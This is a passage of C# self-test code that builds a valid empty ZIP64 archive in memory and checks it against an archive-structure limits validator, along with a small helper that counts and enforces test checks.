        stream.Position = 0;
        return stream;
    }

    private static bool TestValidEmptyZip64Preflight()
    {
        byte[] bytes = new byte[56 + 20 + 22];
        Span<byte> zip64End = bytes.AsSpan(0, 56);
        BinaryPrimitives.WriteUInt32LittleEndian(zip64End, 0x06064B50);
        BinaryPrimitives.WriteUInt64LittleEndian(zip64End[4..], 44);
        BinaryPrimitives.WriteUInt16LittleEndian(zip64End[12..], 45);
        BinaryPrimitives.WriteUInt16LittleEndian(zip64End[14..], 45);

        Span<byte> locator = bytes.AsSpan(56, 20);
        BinaryPrimitives.WriteUInt32LittleEndian(locator, 0x07064B50);
        BinaryPrimitives.WriteUInt64LittleEndian(locator[8..], 0);
        BinaryPrimitives.WriteUInt32LittleEndian(locator[16..], 1);

        Span<byte> endRecord = bytes.AsSpan(76, 22);
        BinaryPrimitives.WriteUInt32LittleEndian(endRecord, 0x06054B50);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord[4..], UInt16.MaxValue);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord[6..], UInt16.MaxValue);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord[8..], UInt16.MaxValue);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord[10..], UInt16.MaxValue);
        BinaryPrimitives.WriteUInt32LittleEndian(endRecord[12..], UInt32.MaxValue);
        BinaryPrimitives.WriteUInt32LittleEndian(endRecord[16..], UInt32.MaxValue);

        using var stream = new MemoryStream(bytes, writable: false);
        return FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static void Require(bool condition, ref int checks)
    {
        checks++;
        if (!condition) throw new InvalidOperationException("A product self-test check failed.");
    }
}
